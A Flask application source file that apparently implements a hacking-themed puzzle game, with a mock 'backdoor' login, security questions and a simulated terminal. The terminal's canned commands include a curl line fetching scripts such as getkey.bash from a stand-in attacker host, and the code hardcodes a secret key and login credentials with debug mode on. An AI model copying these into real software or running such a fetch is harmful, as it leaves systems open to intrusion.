'''
Simple Flask application to test deployment to Amazon Web Services
Uses Elastic Beanstalk and RDS

Author: Scott Rodkey - rodkeyscott@gmail.com

Step-by-step tutorial: https://medium.com/@rodkey/deploying-a-flask-application-on-aws-a72daba6bb80
'''

from flask import Flask, render_template, request, redirect, url_for
from application.forms import EnterSecAnswer, EnterLogin

# Elastic Beanstalk initalization
application = Flask(__name__)
application.debug=True
# change this to your own value
application.secret_key = 'cC1YCIWOj9GgWspgNEo2'
images_folder = "static/images/"
page_names = {
    "backdoor_login": "myfirstbackdoor",
    "security_questions": "security_questions",
    "terminal": "bash",
    "terminal2": "bash_attackerstuff",
    "extract_key": "keyextractor"
}

login_creds = ["rygrange", "chic0theman0"]
seq_q_and_a_ids = ["dm6H5bAyl7b7i6fMC45Vzq7gngh2IRtR", "6Cj8li3wYizzmOzz9K77YO3UPDqnstUZ"]
captcha_ids = ["6@sUmx*g^Jx2SJfolyyQwcLmJXESYb2H","AN43DnJd7Ot9FQ0vSsKjNGaE4mHaGPFz"]

sec_q_and_as = {
    seq_q_and_a_ids[0]: 
        {"question": "What city were you born in?",
         "answer": "chicago",
         "place_holder": "Enter City of Birth",
         "image": "cisco_draw.gif",
         "next_id": seq_q_and_a_ids[1]},
    seq_q_and_a_ids[1]:
        {"question": "What city were you born in?",
         "answer": "chicago",
         "place_holder": "Enter City of Birth",
         "solution": "othersme-ciphertext.png",
         "image": "cisco_draw.gif",
         "next_id": page_names["terminal"]}
}

captcha_dict = {
    captcha_ids[0]:
        {"question": "What city were you born in?",
         "answer": "chicago",
         "place_holder": "Enter City of Birth",
         "solution": "othersme-ciphertext.png",
         "image": "cisco_draw.gif"},
         
    captcha_ids[1]:
        {"question": "What was the name of your first pet?",
         "answer": "plumcot",
         "place_holder": "Enter Name of Pet",
         "solution": "own-ciphertext.png",
         "image": "next.gif"}
}
terminal_commands = {
    "curl -R -k 'http://attackerstuff/' -O": """\
downloaded attackerstuff/decryptfile.bash
downloaded attackerstuff/findfile.bash
downloaded attackerstuff/getkey.bash
downloaded attackerstuff/getlocationhint.bash\
""",
    "ls": "lostfile lostfolder secretfolder",
    "cd lostfolder": "Nothing in here to see",
    "cd secretfolder": "Nothing in here to see",
    "cd attackerstuff": "" ,
    "cat lostfile": "This is a lost file. Please send it back home." ,
    "pwd": "/You/are/here",
    "whoami": "nobody_important",
    "date": "dawn of time",
    "__invalid__": "Invalid Command"
}
terminal2_commands = {
    "ls": "findfile.bash getkey.bash getlocationhint.bash",
    "cd lostfolder": "Nothing in here to see", 
    "cd secretfolder": "Nothing in here to see",
    "cat lostfile": "This is a lost file. Please send it back home.",
    "pwd": "/You/are/here",
    "whoami": "nobody_important",
    "date": "dawn of time",
    "./decryptfile.bash": "",
    "./findfile.bash": "",
    "./getkey.bash": "",
    "./getlocationhint.bash": "",
    "__invalid__": "Invalid Command"
}

@application.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')



@application.route('/captcha<id>', methods=['GET', 'POST'])
def captcha(id):
    captcha_dict_entry = id
    if captcha_dict_entry not in captcha_dict:
        return render_template('call_the_cops.html')
    question = captcha_dict[captcha_dict_entry]['question']
    answer = captcha_dict[captcha_dict_entry]['answer']
    place_holder = captcha_dict[captcha_dict_entry]['place_holder']
    form = EnterSecAnswer(request.form)
    image = images_folder + captcha_dict[captcha_dict_entry]['image']
    feedback = None

    if request.method == 'POST' and form.validate():
        data_entered = form.answer.data
        if data_entered.lower() == answer.lower():
            return render_template('dynamic_key.html', solution=captcha_dict[captcha_dict_entry]['solution'])
        feedback = ':-( wrong answer, try again'

    return render_template('secquestion.html', image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)

@application.route('/' + page_names["backdoor_login"], methods=['GET', 'POST'])
def backdoor_login():
    html_template = 'backdoor.html'
    image = images_folder + "shhh.jpg"
    place_holder = ""
    form = EnterLogin(request.form)
    feedback = None
    if request.method == 'POST' and form.validate():
        user_entered = form.user.data
        password_entered = form.password.data
        if (user_entered, password_entered) == (login_creds[0], login_creds[1]):
            return redirect(url_for('security_questions', id=seq_q_and_a_ids[0]))
        feedback = "Credentials Invalid"
    
    return render_template(html_template, placeholder=place_holder, image=image, form=form, feedback=feedback)

@application.route('/' + page_names["security_questions"] + "<id>", methods=['GET', 'POST'])
def security_questions(id):
    html_template = 'secquestion.html'
    form = EnterSecAnswer(request.form)
    question = sec_q_and_as[id]["question"]
    place_holder = "Enter answer here"
    image = None
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data
        if answer == sec_q_and_as[id]["answer"]:
            next_id = sec_q_and_as[id]["next_id"]
            if next_id == page_names["terminal"]:
                return redirect(url_for('terminal'))
            elif next_id == captcha_ids[0]:
                return redirect(url_for("captcha", id=next_id))
            else:
                return redirect(url_for(page_names["security_questions"], id=next_id))
        feedback = "Credentials Invalid"
        image = "ahhahhahh.jpg"

    return render_template(html_template, image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)
@application.route('/' + page_names["terminal"], methods=['GET', 'POST'])
def terminal():
    html_template = 'terminal.html'
    form = EnterSecAnswer(request.form)
    question = "Ready for input"
    place_holder = "Enter answer here"
    image = None
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data
        if answer in terminal_commands:
            if terminal_commands[answer]:
                feedback = terminal_commands[answer]
                image = "ahhahhahh.jpg"
            else:
                return redirect(url_for("terminal2"))
        else:
            feedback = terminal_commands["__invalid__"]
            image = "ahhahhahh.jpg"
    return render_template(html_template, image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)
@application.route('/' + page_names["terminal2"], methods=['GET', 'POST'])
def terminal2():
    html_template = 'secquestion.html'
    form = EnterSecAnswer(request.form)
    question = "Ready for input"
    place_holder = "Enter answer here"
    image = "static/images/"
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data
        if answer in terminal2_commands:
            if terminal2_commands[answer]:
                feedback = terminal2_commands[answer]
                image += "ahhahhahh.jpg"
            else:
                if answer == "./getkey.bash":
                    return redirect(url_for("extract_key"))
            feedback = terminal2_commands["__invalid__"]
            image += "ahhahhahh.jpg"
        else:
            feedback = terminal2_commands["__invalid__"]
            image += "ahhahhahh.jpg"

    return render_template(html_template, image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)

@application.route('/' + page_names["extract_key"], methods=['GET', 'POST'])
def extract_key():
    html_template = 'secquestion.html'
    form = EnterSecAnswer(request.form)
    question = "Ready for input"
    place_holder = "Enter answer here"
    image = "static/images/"
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data
        if answer in terminal2_commands:
            if terminal2_commands[answer]:
                feedback = terminal2_commands[answer]
                image += "ahhahhahh.jpg"
            else:
                return redirect(url_for("extract_key"))
        else:
            feedback = terminal2_commands["__invalid__"]
            image += "ahhahhahh.jpg"

    return render_template(html_template, image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)

if __name__ == '__main__':
    application.run(host='0.0.0.0')
